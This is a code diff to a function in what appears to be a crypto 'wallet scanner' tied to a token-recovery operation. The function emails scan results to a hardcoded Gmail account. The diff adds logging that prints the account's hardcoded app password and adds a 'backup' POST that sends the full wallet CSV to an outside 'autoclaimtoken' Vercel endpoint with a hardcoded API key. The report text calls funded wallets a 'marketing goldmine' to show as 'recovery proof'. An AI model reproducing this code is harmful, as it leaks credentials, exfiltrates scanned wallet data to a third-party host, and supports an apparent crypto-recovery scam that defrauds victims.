@@ -319,12 +319,17 @@ async function sendCompleteResults(wallets, totalScanned) {
     const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
     const message = `WALLET SCANNER COMPLETE REPORT\n\n📊 THIS SCAN: ${totalScanned} wallets\n💰 FUNDED WALLETS: ${walletsWithFunds.length}\n💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}\n📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%\n\n${statsMessage}\n\n📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets\n\n💡 MARKETING GOLDMINE:\n- ${walletsWithFunds.length} wallets with real funds ready for social media\n- Import CSV to filter and sort by value\n- Use funded addresses as recovery proof\n- Show authentic blockchain balances\n\n🎯 TOP FUNDED WALLETS:\n${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
 
+    console.log('📧 Gmail password available:', process.env.GMAIL_APP_PASSWORD ? 'YES' : 'NO');
+    console.log('📧 Using password:', process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr');
+    
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
         user: 'skillstakes01@gmail.com',
         pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
-      }
+      },
+      debug: true,
+      logger: true
     });
 
     console.log('📧 Sending email with subject:', subject);
@@ -345,6 +350,24 @@ async function sendCompleteResults(wallets, totalScanned) {
     
     console.log('✅ CSV email sent successfully! Message ID:', result.messageId);
     console.log('📧 Email response:', JSON.stringify(result, null, 2));
+    
+    // Also try Vercel API as backup
+    try {
+      const axios = require('axios');
+      const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
+        subject: subject,
+        message: message + '\n\nCSV DATA:\n' + csvContent
+      }, {
+        timeout: 10000,
+        headers: {
+          'Content-Type': 'application/json',
+          'x-api-key': 'crypto-recover-2024'
+        }
+      });
+      console.log('✅ Backup email via Vercel also sent!');
+    } catch (backupError) {
+      console.log('⚠️ Backup email failed:', backupError.message);
+    }
     
   } catch (error) {
     console.error('❌ Failed to send CSV email:', error);
